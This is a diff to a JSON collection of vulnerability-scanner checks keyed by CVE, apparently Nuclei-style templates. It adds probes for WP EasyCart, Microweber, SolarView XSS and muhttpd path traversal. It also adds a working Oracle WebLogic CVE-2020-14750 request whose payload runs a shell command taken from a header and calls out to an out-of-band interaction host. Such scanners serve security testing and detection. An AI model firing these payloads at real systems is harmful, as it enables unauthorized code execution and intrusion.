@@ -3272,6 +3272,21 @@
       ]
     },
     {
+      "id": "CVE-2014-4942",
+      "info": {
+        "name": "WP EasyCart - Information Disclosure",
+        "severity": "low"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wp-easycart/inc/admin/phpinfo.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2014-5111",
       "info": {
         "name": "Fonality trixbox - Directory Traversal",
@@ -10670,6 +10685,20 @@
       ]
     },
     {
+      "id": "CVE-2020-14750",
+      "info": {
+        "name": "Oracle WebLogic Server - Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 10s\nPOST /console/css/%252e%252e%252fconsole.portal HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: curl/7.79.1\nAccept: */*\ncmd: curl {{interactsh-url}}\nContent-Type: application/x-www-form-urlencoded\n\n_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();\nweblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();\njava.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");\nfield.setAccessible(true);\nObject obj = field.get(adapter);\nweblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\"getServletRequest\").invoke(obj);\nString cmd = req.getHeader(\"cmd\");\nString[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};\nif (cmd != null) {\n    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\"\\\\A\").next();\n    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(\"getResponse\").invoke(req);\n    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));\n    res.getServletOutputStream().flush();\n    res.getWriter().write(\"\");\n}executeThread.interrupt();\n\");\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-14864",
       "info": {
         "name": "Oracle Fusion - Directory Traversal/Local File Inclusion",
@@ -16238,8 +16267,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
@@ -18273,6 +18302,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0660",
+      "info": {
+        "name": "Microweber < 1.2.11 - Information Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /api/user_login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
+            "POST /module/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: {{BaseURL}}admin/view:comments\n\nclass=+module+module-comments-manage+&id=mw_admin_posts_with_comments&data-type=comments%2Fmanage&parent-module-id=mw-main-module-backend&parent-module=comments&data-search-keyword={{randstr}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0692",
       "info": {
         "name": "Rudloff alltube prior to 3.0.1 - Open Redirect",
@@ -19666,6 +19710,21 @@
       "info": {
         "name": "SolarView Compact 6.00 - Cross-Site Scripting(XSS)",
         "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Solar_AiConf.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-31793",
+      "info": {
+        "name": "muhttpd <= 1.1.5 - Path traversal",
+        "severity": "high"
       },
       "requests": [
         {
